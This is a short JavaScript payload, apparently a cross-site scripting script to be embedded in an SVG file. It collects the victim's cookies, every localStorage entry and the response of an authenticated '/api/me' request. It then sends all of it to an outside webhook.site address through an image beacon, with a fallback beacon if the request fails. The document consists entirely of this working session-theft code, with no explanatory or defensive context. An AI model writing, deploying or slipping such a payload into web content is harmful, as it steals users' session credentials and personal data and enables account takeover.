svg.script:
var dump = {};
try { dump.cookie = document.cookie; } catch (e) { dump.cookie = 'err ' + e.message; }
try {
  var ls = [];
  for (var i = 0; i < localStorage.length; i++) { var k = localStorage.key(i); ls.push(k + '=' + localStorage.getItem(k)); }
  dump.localStorage = ls;
} catch (e) { dump.localStorage = 'err ' + e.message; }
try {
  fetch('/api/me', {credentials:'include'}).then(function (r) { return r.text(); })
    .then(function (d) {
      dump.api_me = d.substring(0, 2000);
      document.getElementById('out').textContent = 'SESSION DUMP: ' + JSON.stringify(dump);
      new Image().src = 'https://webhook.site/57808f6c-20d5-426f-9ba5-ea67945d1f49?d=' + encodeURIComponent(JSON.stringify(dump));
    })
    .catch(function (e) { dump.api_me = 'err ' + e.message; beacon(); });
} catch (e) { dump.api_me = 'boo ' + e.message; beacon(); }
function beacon() {
  new Image().src = 'https://webhook.site/57808f6c-20d5-426f-9ba5-ea67945d1f49?d=' + encodeURIComponent(JSON.stringify(dump));
}
